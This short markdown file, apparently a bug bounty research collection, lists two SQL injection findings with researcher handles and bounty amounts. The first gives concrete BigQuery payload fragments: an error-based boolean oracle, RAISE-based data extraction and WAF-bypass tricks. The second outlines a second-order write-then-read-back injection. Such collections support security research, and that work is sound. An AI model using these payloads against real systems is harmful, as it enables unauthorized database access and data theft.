# Payloads — sqli

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. Unauthenticated BigQuery SQLi via WAF-bypassing error-channel extraction ($4,000)
- Researcher: @infinitelogins
- Post: https://x.com/infinitelogins/status/2110355630133322159
- Sources: `posts/infinitelogins/2026-10-14-2110355630133322159.md`

```
JSON param with `'`; boolean: `IF TRUE THEN ASSERT FALSE; END IF;` → 500 vs FALSE → 200; extract: `RAISE USING MESSAGE = <query result>`; WAF bypass: `EXECUTE/**/IMMEDIATE` and `REVERSE('AMEHCS_NOITAMROFNI')`
```

## 1. Unauthenticated SQL injection in a public quote flow ($4,000)
- Researcher: @mdp_sec
- Post: https://x.com/mdp_sec/status/2120066429223317560
- Sources: `posts/mdp_sec/2026-11-10-2120066429223317560.md`, `writeups/mdp_sec/bug-bounty-hunting-prompts-readme.md`, `writeups/mdp_sec/mdpsec-home.md`, `writeups/mdp_sec/mdpsec-privacy.md`, `writeups/mdp_sec/mdpsec-security-test.md`, `writeups/mdp_sec/platform-reports.md`

```
POST JSON to the public /retrieve endpoint; inject into the reflected field; stage a record under a controlled reference; GET the reference back to read DB-evaluated columns (second-order / write-then-read-back)
```
